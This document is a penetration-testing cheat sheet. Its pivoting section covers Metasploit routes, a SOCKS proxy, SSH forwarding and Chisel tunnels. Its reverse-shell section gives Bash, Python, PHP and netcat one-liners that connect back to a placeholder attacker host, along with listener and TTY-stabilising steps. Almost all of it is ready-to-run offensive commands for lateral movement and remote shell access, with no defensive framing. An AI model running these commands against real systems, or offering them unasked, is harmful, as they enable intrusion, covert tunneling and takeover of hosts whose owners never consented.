Pivoting

Lateral movement & tunneling
Metasploit Route-Based Pivot
route add 192.168.2.0/24 <session_id> route print route remove 192.168.2.0/24 <session_id>
After adding route, Metasploit modules can reach the internal network through the session.
Socks Proxy via Metasploit
use auxiliary/server/socks_proxy set SRVPORT 9050 set VERSION 5 run -j proxychains nmap -sT -p 80,443 192.168.2.<x> proxychains curl http://192.168.2.10
SSH Port Forwarding
ssh -L <local_port>:<target>:<remote_port> user@<pivot> ssh -L 3306:192.168.2.10:3306 user@pivot ssh -D 9050 user@<pivot> ssh -R 4444:localhost:4444 user@pivot
proxychains Config
cat /etc/proxychains.conf
Set socks5 127.0.0.1 9050 at the bottom of proxychains.conf. Comment out other proxy lines.
Netcat / Chisel Tunneling
nc -lvnp 4444 chisel server -p 8080 --reverse chisel client <attacker>:8080 R:9050:socks
Meterpreter Port Forward
portfwd add -l 4444 -p 4444 -r <internal-host> portfwd list

Reverse Shells

One-liners for initial access
Listener (Attacker Side)
nc -lvnp 4444 rlwrap nc -lvnp 4444
Bash
bash -i >& /dev/tcp/<attacker>/4444 0>&1
Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
PHP
php -r '$s=fsockopen("<attacker>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
Netcat
nc -e /bin/sh <attacker> 4444 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker> 4444 >/tmp/f
Stabilise Shell (TTY)
python3 -c 'import pty;pty.spawn("/bin/bash")' export TERM=xterm
Then press Ctrl+Z, run stty raw -echo; fg, hit Enter twice.
